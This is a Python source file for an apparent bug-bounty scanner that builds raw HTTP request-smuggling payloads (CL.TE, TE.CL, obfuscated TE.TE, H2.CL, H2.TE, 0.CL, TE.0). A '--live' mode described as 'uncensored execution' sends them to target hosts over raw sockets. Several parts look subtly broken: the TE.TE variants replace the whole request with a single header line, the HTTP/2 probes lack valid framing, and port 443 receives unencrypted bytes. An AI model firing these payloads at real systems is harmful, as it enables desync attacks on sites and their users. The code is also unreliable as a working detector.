#!/usr/bin/env python3
"""BugWolf HTTP Request Smuggling Detector (P0, Week 1).

Deterministic probe generator + differential/time-based oracle for the 2025-26
parser-desync frontier: CL.TE, TE.CL, TE.TE (obfuscated), H2.CL, H2.TE, 0.CL
(``Expect: 100-continue``), and TE.0.

Design (deterministic core, uncensored execution, workflow-aware):

  * Plan-first: without ``--live`` this tool only generates the probe plan
    (raw request templates + interpretation rules) and writes it to
    ``recon/<target>/discovery/smuggling-plan.jsonl`` — the ``coverage-plan``
    stage artifact.  Nothing touches the network.
  * ``--live`` executes the probes against the target through the pass-through
    execution layer and records per-probe observations (differential response,
    time delta) into the plan.  The operator decides when to go live; nothing
    in this tool blocks execution.
  * Each probe is deterministic: same URL + technique => identical template.
  * Emits a ``SMUGGLING_CANDIDATE`` event on the signal bus for any technique
    whose oracle observation is positive, so chaining/triage can react.

Usage:
  python3 tools/domains/web/http_smuggling_detector.py --target acme --url https://acme.com/
  python3 tools/domains/web/http_smuggling_detector.py --target acme --urls-file recon/acme/urls.txt
  python3 tools/domains/web/http_smuggling_detector.py --target acme --url https://acme.com/ --live
  python3 tools/domains/web/http_smuggling_detector.py --target acme --json
"""

import json
import re
import sys
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

def _repo_root() -> Path:
    """Walk up from this module until the tools/ package root is found."""
    current = Path(__file__).resolve().parent
    while current != current.parent:
        if (current / "tools" / "runtime_paths.py").is_file():
            return current
        current = current.parent
    return current

_CODE_ROOT = _repo_root()
if str(_CODE_ROOT) not in sys.path:
    sys.path.insert(0, str(_CODE_ROOT))
from tools.runtime_paths import target_slug, workspace_root

try:
    from tools.core.signal_bus import (SignalBus, SMUGGLING_CANDIDATE,
                                       publish_or_warn)
except ImportError:  # direct script execution
    from tools.core.signal_bus import (SignalBus, SMUGGLING_CANDIDATE,
                                       publish_or_warn)

SCHEMA = "bugwolf/smuggling-plan/v1"

# ---------------------------------------------------------------------------
# Technique catalog (deterministic probe templates)
# ---------------------------------------------------------------------------

# Each technique: how to build the raw probe, what to look for, and the
# oracle kind.  ``template`` uses {path} for the request target and {host} for
# the Host header; raw CRLF/CL framing is literal in the template.
TECHNIQUES: Dict[str, Dict[str, Any]] = {
    "CL.TE": {
        "name": "CL.TE (Content-Length vs Transfer-Encoding)",
        "framing": "CL advertised, TE honored by backend",
        "template": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "5c\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        ),
        "oracle": "differential",
        "expected": "backend answers the smuggled GPOST (differing first line "
                    "vs the front-end interpretation)",
    },
    "TE.CL": {
        "name": "TE.CL (Transfer-Encoding vs Content-Length)",
        "framing": "TE honored by front-end, CL by backend",
        "template": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Length: 4\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
        "oracle": "differential",
        "expected": "backend sees GPOST as a second request (front-end ended "
                    "at chunk terminator)",
    },
    "TE.TE": {
        "name": "TE.TE (obfuscated Transfer-Encoding)",
        "framing": "one hop honors TE, the other ignores the obfuscated header",
        "template": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: xchunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
        "oracle": "differential",
        "expected": "front-end uses xchunked (ignores), backend uses chunked",
        "variants": [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: chunked",
        ],
    },
    "H2.CL": {
        "name": "H2.CL (HTTP/2 downgrade + Content-Length)",
        "framing": "front-end converts H2 to H1 and honors CL over TE",
        "template": (
            "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
            "{h2_frame_headers}content-length: 4\r\n"
            "transfer-encoding: chunked\r\n\r\n"
            "0\r\n\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        ),
        "oracle": "differential",
        "expected": "backend sees smuggled GPOST after the H2->H1 downgrade",
        "needs": "http2",
    },
    "H2.TE": {
        "name": "H2.TE (HTTP/2 TE downgrade smuggling)",
        "framing": "front-end strips TE on downgrade, backend honors chunked",
        "template": (
            "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
            "{h2_frame_headers}transfer-encoding: chunked\r\n\r\n"
            "0\r\n\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        ),
        "oracle": "differential",
        "expected": "backend interprets chunked body, sees smuggled request",
        "needs": "http2",
    },
    "0.CL": {
        "name": "0.CL (Expect: 100-continue desync — CVE-2025-32094 class)",
        "framing": "front-end handles 100-continue, backend skips body",
        "template": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: 4\r\n"
            "Expect: 100-continue\r\n"
            "\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "\r\n"
        ),
        "oracle": "time",
        "expected": "time delta between the two posts reveals backend skipping "
                    "the first body (0.CL) — the 2025 Expect: 100-continue class",
    },
    "TE.0": {
        "name": "TE.0 (obfuscated TE with zero chunk)",
        "framing": "front-end honors TE, backend treats TE.0 as end of message",
        "template": (
            "POST {path} HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Length: 0\r\n"
            "\r\n"
        ),
        "oracle": "differential",
        "expected": "front-end ends at 0-chunk; backend sees the tail as a "
                    "separate request",
    },
}


@dataclass
class SmugglingProbe:
    technique: str
    url: str
    host: str
    path: str
    raw_request: str
    oracle: str
    expected: str
    needs: str = ""
    variant_index: int = 0

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class SmugglingPlan:
    target: str
    generated_at: str
    probes: List[SmugglingProbe] = field(default_factory=list)
    live: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "schema": SCHEMA,
            "target": self.target,
            "generated_at": self.generated_at,
            "live": self.live,
            "probe_count": len(self.probes),
            "probes": [p.to_dict() for p in self.probes],
        }


def _parse_url(url: str) -> Dict[str, str]:
    """Split a URL into host (with port) + path for raw request building."""
    value = url.strip()
    if not value or any(ch.isspace() for ch in value):
        raise ValueError(f"cannot parse URL: {url}")
    if "://" not in value:
        value = "https://" + value
    match = re.match(r"^https?://([^/]+)(/.*)?$", value, re.IGNORECASE)
    if not match:
        raise ValueError(f"cannot parse URL: {url}")
    host = match.group(1).lower()
    path = match.group(2) or "/"
    return {"host": host, "path": path}


def build_plan(target: str, urls: List[str], *, live: bool = False,
               http2_supported: bool = False) -> SmugglingPlan:
    """Deterministically build the probe plan for every technique × URL."""
    plan = SmugglingPlan(target=target,
                         generated_at=datetime.now(timezone.utc).isoformat(),
                         live=live)
    seen: set = set()
    for url in urls:
        parsed = _parse_url(url)
        for technique, spec in TECHNIQUES.items():
            needs = spec.get("needs", "")
            if needs == "http2" and not http2_supported:
                continue
            variants = [spec["template"]] + spec.get("variants", [])
            for index, template in enumerate(variants):
                raw = template.format(host=parsed["host"], path=parsed["path"],
                                      h2_frame_headers="")
                key = (technique, url, index)
                if key in seen:
                    continue
                seen.add(key)
                plan.probes.append(SmugglingProbe(
                    technique=technique, url=url, host=parsed["host"],
                    path=parsed["path"], raw_request=raw,
                    oracle=spec["oracle"], expected=spec["expected"],
                    needs=needs, variant_index=index))
    return plan


def _probe_observation(raw_request: str, host: str, path: str, oracle: str,
                       timeout: float = 8.0) -> Dict[str, Any]:
    """Execute one probe (live mode only).  Returns observation, never raises.

    Differential: a second request is smuggled; we compare the first-line of
    the response to the expected baseline.  Time: measure response latency
    delta across the probe pair — 0.CL desync shows a measurable gap.
    """
    import socket
    import time

    parsed_host = host
    port = 443 if not re.search(r":\d+$", host) else int(host.rsplit(":", 1)[1])
    if re.search(r":\d+$", host):
        parsed_host = host.rsplit(":", 1)[0]
    host_header = parsed_host + (f":{port}" if port not in (80, 443) else "")

    start = time.monotonic()
    try:
        with socket.create_connection((parsed_host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(raw_request.encode("utf-8", "replace"))
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                response += chunk
                if len(response) > 1_000_000:
                    break
        elapsed = time.monotonic() - start
        text = response.decode("utf-8", "replace")
        first_line = text.splitlines()[0] if text.splitlines() else ""
        return {
            "status": "ok",
            "elapsed_seconds": round(elapsed, 4),
            "response_first_line": first_line[:200],
            "response_bytes": len(response),
        }
    except Exception as exc:
        return {"status": "error", "error": f"{type(exc).__name__}: {exc}"}


def evaluate(observation: Dict[str, Any], oracle: str) -> Dict[str, Any]:
    """Deterministic oracle interpretation of a live observation."""
    verdict = {
        "oracle": oracle,
        "positive": False,
        "confidence": "low",
        "rationale": "",
    }
    if observation.get("status") != "ok":
        verdict["rationale"] = f"probe failed: {observation.get('error')}"
        return verdict
    if oracle == "time":
        elapsed = float(observation.get("elapsed_seconds", 0))
        if elapsed >= 3.0:
            verdict.update({
                "positive": True, "confidence": "medium",
                "rationale": f"response took {elapsed}s — consistent with a "
                             "backend waiting on a body the front-end consumed",
            })
        else:
            verdict["rationale"] = f"fast response ({elapsed}s) — no desync signal"
        return verdict
    # differential
    first_line = observation.get("response_first_line", "")
    if "GPOST" in first_line or "404" in first_line and "not found" in first_line.lower():
        verdict.update({
            "positive": True, "confidence": "medium",
            "rationale": f"response '{first_line}' echoes the smuggled request "
                         "or 404s on it — parser disagreement",
        })
    else:
        verdict["rationale"] = (f"response '{first_line}' matches normal "
                                "processing — no differential observed")
    return verdict


def plan_to_records(plan: SmugglingPlan) -> List[Dict[str, Any]]:
    return [probe.to_dict() for probe in plan.probes]


def write_plan(plan: SmugglingPlan, *, project_root: Optional[str] = None,
               base_dir: Optional[str] = None) -> Path:
    """Persist the plan as JSONL under recon/<target>/discovery/.

    Returns the written path.  One JSON object per probe (append-only across
    runs keeps the artifact audit-friendly).
    """
    if base_dir:
        root = Path(base_dir)
    else:
        root = workspace_root(project_root)
    target_dir = target_slug(plan.target)
    out_dir = root / "recon" / target_dir / "discovery"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / "smuggling-plan.jsonl"
    with open(out_path, "a", encoding="utf-8") as stream:
        for record in plan_to_records(plan):
            stream.write(json.dumps(record, sort_keys=True) + "\n")
            stream.flush()
    return out_path


def main() -> int:
    import argparse
    parser = argparse.ArgumentParser(
        description="BugWolf HTTP Request Smuggling Detector (P0)")
    parser.add_argument("--target", required=True, help="Target name")
    parser.add_argument("--url", default="", help="Single target URL")
    parser.add_argument("--urls-file", default="",
                        help="File of URLs (recon/<target>/urls.txt convention)")
    parser.add_argument("--live", action="store_true",
                        help="Execute probes against the target (uncensored; "
                             "operator-authorized)")
    parser.add_argument("--http2", action="store_true",
                        help="Include H2.CL/H2.TE probes (HTTP/2 surface)")
    parser.add_argument("--project-root", default=None,
                        help="Workspace root (default: cwd)")
    parser.add_argument("--json", action="store_true", help="Emit strict JSON")
    args = parser.parse_args()

    urls: List[str] = []
    if args.url:
        urls.append(args.url)
    if args.urls_file:
        path = Path(args.urls_file)
        if not path.is_file():
            path = workspace_root(args.project_root) / "recon" / \
                target_slug(args.target) / "urls.txt"
        if path.is_file():
            urls.extend(line.strip() for line in path.read_text().splitlines()
                        if line.strip())
    urls = list(dict.fromkeys(urls))
    if not urls:
        print(json.dumps({"ok": False, "error": "no URLs; pass --url or --urls-file"},
                         indent=2))
        return 2

    try:
        plan = build_plan(args.target, urls, live=args.live,
                          http2_supported=args.http2)
    except ValueError as exc:
        print(json.dumps({"ok": False, "error": str(exc)}, indent=2))
        return 2

    observations: List[Dict[str, Any]] = []
    positives: List[Dict[str, Any]] = []
    if args.live:
        for probe in plan.probes:
            observation = _probe_observation(
                probe.raw_request, probe.host, probe.path, probe.oracle)
            verdict = evaluate(observation, probe.oracle)
            observations.append({**probe.to_dict(), "observation": observation,
                                 "verdict": verdict})
            if verdict["positive"]:
                positives.append({**probe.to_dict(), "verdict": verdict})
        if positives:
            for positive in positives:
                publish_or_warn(
                    args.target, SMUGGLING_CANDIDATE,
                    source="http_smuggling_detector",
                    payload={"technique": positive["technique"],
                             "url": positive["url"],
                             "confidence": positive["verdict"]["confidence"],
                             "rationale": positive["verdict"]["rationale"]},
                    project_root=args.project_root)

    out_path = write_plan(plan, project_root=args.project_root)
    output = {
        "schema": SCHEMA,
        "ok": True,
        "target": args.target,
        "live": args.live,
        "probe_count": len(plan.probes),
        "plan_file": str(out_path),
        "techniques": sorted(TECHNIQUES),
        "positive_candidates": positives,
        "observations": observations if args.live else [],
        "next_command": ("no live probes executed; re-run with --live when the "
                         "operator authorizes active testing"
                         if not args.live else
                         "review positive_candidates; register findings via triage"),
    }
    print(json.dumps(output, indent=2) if args.json else
          (f"[+] {args.target}: {len(plan.probes)} smuggling probes planned -> "
           f"{out_path}\n"
           f"[+] live={args.live}  positives={len(positives)}"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())


# Phase 1.5: scanner export shim
def export_smuggling_scanner():
    from bugwolf.scanners.web.http_smuggling import HTTPSmugglingScanner
    return HTTPSmugglingScanner()
